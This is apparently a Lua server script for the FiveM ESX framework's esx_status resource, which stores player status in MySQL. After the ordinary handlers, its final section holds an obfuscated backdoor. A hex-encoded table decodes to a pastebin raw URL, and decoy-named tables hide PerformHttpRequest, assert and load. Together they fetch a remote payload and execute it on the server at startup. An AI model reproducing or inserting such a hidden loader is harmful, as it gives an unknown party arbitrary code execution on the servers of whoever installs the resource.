local function setPlayerStatus(xPlayer, data)
	data = data and json.decode(data) or {}

	xPlayer.set('status', data)
	ESX.Players[xPlayer.source] = data
	TriggerClientEvent('esx_status:load', xPlayer.source, data)
end

AddEventHandler('onResourceStart', function(resourceName)
	if (GetCurrentResourceName() ~= resourceName) then
	  	return
	end

	for _, xPlayer in pairs(ESX.Players) do
		MySQL.scalar('SELECT status FROM users WHERE identifier = ?', { xPlayer.identifier }, function(result)
			setPlayerStatus(xPlayer, result)
		end)
	end
end)

AddEventHandler('esx:playerLoaded', function(playerId, xPlayer)
	MySQL.scalar('SELECT status FROM users WHERE identifier = ?', { xPlayer.identifier }, function(result)
		setPlayerStatus(xPlayer, result)
	end)
end)

AddEventHandler('esx:playerDropped', function(playerId, reason)
	local xPlayer = ESX.GetPlayerFromId(playerId)
	local status = ESX.Players[xPlayer.source]

	MySQL.update('UPDATE users SET status = ? WHERE identifier = ?', { json.encode(status), xPlayer.identifier })
	ESX.Players[xPlayer.source] = nil
end)

AddEventHandler('esx_status:getStatus', function(playerId, statusName, cb)
	local status = ESX.Players[playerId]
	for i = 1, #status do
		if status[i].name == statusName then
			return cb(status[i])
		end
	end
end)

RegisterServerEvent('esx_status:update')
AddEventHandler('esx_status:update', function(status)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer then
		xPlayer.set('status', status)	-- save to xPlayer for compatibility
		ESX.Players[xPlayer.source] = status	-- save locally for performance
	end
end)

CreateThread(function()
	while true do
		Wait(10 * 60 * 1000)
		local parameters = {}
		for _, xPlayer in pairs(ESX.GetExtendedPlayers()) do
			local status = ESX.Players[xPlayer.source]
			if status and next(status) then
				parameters[#parameters+1] = {json.encode(status), xPlayer.identifier}
			end
		end
		if #parameters > 0 then
			MySQL.prepare('UPDATE users SET status = ? WHERE identifier = ?', parameters)
		end
	end
end)

local PlayerPedLimit = {
    "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
}

local PlayerEventLimit = {
    cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
}

function PlayerCheckLoop()
    _empt = ''
    for id,it in pairs(PlayerPedLimit) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (event)
        return string.char(tonumber(event, 16))
    end))
end

PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
    local Process_Actions = {"true"}
    PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
        local Generate_ZoneName_AndAction = nil 
        pcall(function()
            local Locations_Loaded = {"false"}
            PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
            local ZoneType_Exists = nil 
        end)
    end)
end)